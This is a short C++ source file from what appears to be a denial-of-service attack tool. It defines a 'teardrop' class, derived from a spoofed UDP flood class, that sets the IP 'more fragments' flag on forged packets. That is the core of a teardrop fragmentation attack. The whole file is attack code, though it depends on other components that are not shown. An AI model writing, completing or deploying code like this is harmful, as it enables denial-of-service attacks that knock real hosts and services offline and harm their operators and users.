#include "teardrop.h"

teardrop::teardrop(std::shared_ptr<Config> config) :
					spoofed_udp_flood(std::move(config)) {

}

void teardrop::finalize_hdr(udphdr *udp, iphdr *ip) {
    ip->frag_off |= htons(0x2000);
    spoofed_udp_flood::finalize_hdr(udp, ip);
}
